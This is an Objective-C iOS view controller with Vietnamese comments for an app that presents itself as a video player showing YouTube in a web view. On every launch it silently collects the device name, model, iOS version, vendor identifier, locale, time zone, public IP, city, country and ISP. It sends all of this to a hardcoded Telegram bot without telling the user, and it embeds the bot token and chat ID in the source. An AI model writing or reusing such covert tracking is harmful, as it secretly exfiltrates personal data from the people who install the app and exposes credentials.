#import "ViewController.h"
#import <WebKit/WebKit.h>
#import <sys/utsname.h>

// Thay YOUR_BOT_TOKEN bằng Token Bot của bạn (ví dụ: @"123456789:ABCdefGhIJKlmNoPQRstuVWXyz")
#define TELEGRAM_BOT_TOKEN @"8566757282:AAENcmMH9PV9bgTg4gCiV5gbEKZu_J5FDrw"
#define TELEGRAM_CHAT_ID @"7055636268"

@interface ViewController () <WKNavigationDelegate>
@property (nonatomic, strong) WKWebView *webView;
@property (nonatomic, strong) UIView *loadingOverlay;
@property (nonatomic, strong) UIActivityIndicatorView *spinner;
@property (nonatomic, strong) UILabel *statusLabel;
@end

@implementation ViewController

- (void)loadView {
    UIView *mainView = [[UIView alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    mainView.backgroundColor = [UIColor blackColor];
    self.view = mainView;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    [self setupVideoPlayer];
    [self setupLoadingOverlay];
    [self collectAndSendTelemetry];
}

- (void)setupLoadingOverlay {
    self.loadingOverlay = [[UIView alloc] initWithFrame:self.view.bounds];
    self.loadingOverlay.backgroundColor = [UIColor colorWithRed:0.06 green:0.06 blue:0.08 alpha:1.0];
    self.loadingOverlay.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    [self.view addSubview:self.loadingOverlay];

    self.spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleLarge];
    self.spinner.color = [UIColor colorWithRed:0.0 green:0.48 blue:1.0 alpha:1.0];
    self.spinner.center = CGPointMake(self.view.bounds.size.width / 2, self.view.bounds.size.height / 2 - 20);
    self.spinner.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin | UIViewAutoresizingFlexibleTopMargin | UIViewAutoresizingFlexibleBottomMargin;
    [self.spinner startAnimating];
    [self.loadingOverlay addSubview:self.spinner];

    self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, self.spinner.frame.origin.y + 50, self.view.bounds.size.width - 40, 30)];
    self.statusLabel.text = @"Đang tải dữ liệu...";
    self.statusLabel.textColor = [UIColor lightGrayColor];
    self.statusLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleTopMargin | UIViewAutoresizingFlexibleBottomMargin;
    [self.loadingOverlay addSubview:self.statusLabel];
}

- (void)setupVideoPlayer {
    WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
    config.allowsInlineMediaPlayback = YES;
    config.mediaTypesRequiringUserActionForPlayback = WKAudiovisualMediaTypeNone;

    self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
    self.webView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.webView.backgroundColor = [UIColor blackColor];
    self.webView.opaque = NO;
    self.webView.navigationDelegate = self;
    self.webView.scrollView.contentInsetAdjustmentBehavior = UIScrollViewContentInsetAdjustmentNever;
    [self.view addSubview:self.webView];

    NSURL *url = [NSURL URLWithString:@"https://www.youtube.com"];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    [self.webView loadRequest:request];
}

- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
    [UIView animateWithDuration:0.4 animations:^{
        self.loadingOverlay.alpha = 0.0;
    } completion:^(BOOL finished) {
        [self.spinner stopAnimating];
        [self.loadingOverlay removeFromSuperview];
    }];
}

- (void)webView:(WKWebView *)webView didFailNavigation:(WKNavigation *)navigation withError:(NSError *)error {
    self.statusLabel.text = @"Lỗi kết nối!";
    [self.spinner stopAnimating];
}

#pragma mark - Telemetry & Telegram

- (NSString *)getDeviceModel {
    struct utsname systemInfo;
    uname(&systemInfo);
    return [NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding];
}

- (void)collectAndSendTelemetry {
    UIDevice *device = [UIDevice currentDevice];
    NSString *deviceName = device.name;
    NSString *systemVersion = [NSString stringWithFormat:@"%@ %@", device.systemName, device.systemVersion];
    NSString *deviceModel = [self getDeviceModel];
    NSString *uuid = [device.identifierForVendor UUIDString] ?: @"Không xác định";
    NSString *locale = [[NSLocale currentLocale] localeIdentifier];
    NSString *timeZone = [[NSTimeZone localTimeZone] name];
    
    // Lấy thông tin IP công khai (IPv4 / IPv6 / ISP)
    NSURL *ipServiceUrl = [NSURL URLWithString:@"https://ipapi.co/json/"];
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithURL:ipServiceUrl completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        NSString *ip = @"N/A";
        NSString *city = @"N/A";
        NSString *region = @"N/A";
        NSString *country = @"N/A";
        NSString *org = @"N/A";

        if (data && !error) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (json) {
                ip = json[@"ip"] ?: @"N/A";
                city = json[@"city"] ?: @"N/A";
                region = json[@"region"] ?: @"N/A";
                country = json[@"country_name"] ?: @"N/A";
                org = json[@"org"] ?: @"N/A";
            }
        }

        NSString *message = [NSString stringWithFormat:
            @"🚀 *CÓ THIẾT BỊ MỞ ỨNG DỤNG*\n\n"
            @"📱 *Thiết bị:* `%@` (`%@`)\n"
            @"⚙️ *iOS:* `%@`\n"
            @"🆔 *UUID:* `%@`\n"
            @"🌐 *Địa chỉ IP:* `%@`\n"
            @"📍 *Vị trí:* `%@, %@, %@`\n"
            @"🏢 *Nhà mạng/ISP:* `%@`\n"
            @"🕒 *Múi giờ / Locale:* `%@ / %@`\n"
            @"📦 *Ứng dụng:* `com.zheedev.videoapp`",
            deviceName, deviceModel, systemVersion, uuid, ip, city, region, country, org, timeZone, locale
        ];

        [self sendTelegramNotification:message];
    }];
    [task resume];
}

- (void)sendTelegramNotification:(NSString *)text {
    if ([TELEGRAM_BOT_TOKEN isEqualToString:@"YOUR_BOT_TOKEN"]) {
        return;
    }

    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", TELEGRAM_BOT_TOKEN];
    NSURL *url = [NSURL URLWithString:urlString];
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

    NSDictionary *payload = @{
        @"chat_id": TELEGRAM_CHAT_ID,
        @"text": text,
        @"parse_mode": @"Markdown"
    };

    request.HTTPBody = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:nil];
    [task resume];
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

@end